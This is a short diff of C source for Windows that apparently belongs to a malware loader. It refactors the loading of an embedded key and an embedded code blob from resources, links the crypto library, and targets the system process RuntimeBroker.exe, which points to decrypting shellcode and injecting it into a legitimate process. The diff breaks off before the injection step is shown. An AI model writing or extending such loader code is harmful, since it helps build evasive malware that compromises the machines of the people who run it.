@@ -10,25 +10,27 @@
 
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
-
-void its_load_re(const char* renamer, char** data, DWORD* size) {
-    HMODULE hModule = GetModuleHandle(NULL);
-    
-    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
-    HGLOBAL resrdata = LoadResource(hModule, hResource);
-    *size = SizeofResource(hModule, hResource);
-    *data = (char*)LockResource(resrdata);
-}
-
 int main() {
-    
+
     char* ke;
     DWORD keLen;
-    its_load_re("dhanushkey1", &ke, &keLen);
-    const char* processptaah = "C:\\Windows\\System32\\RuntimeBroker.exe";
+    HMODULE hModule = GetModuleHandle(NULL);
+    HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
+    HGLOBAL resrdata = LoadResource(hModule, hResource);
+    keLen = SizeofResource(hModule, hResource);
+    ke = (char*)LockResource(resrdata);
+
+    // Load the second resource (dhanushcode56)
     char* code199k;
     DWORD code199kLen;
-    its_load_re("dhanushcode56", &code199k, &code199kLen);
+    hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
+    resrdata = LoadResource(hModule, hResource);
+    code199kLen = SizeofResource(hModule, hResource);
+    code199k = (char*)LockResource(resrdata);
+    
+    
+    const char* processptaah = "C:\\Windows\\System32\\RuntimeBroker.exe";
+   
 
     STARTUPINFO li = {0};
     
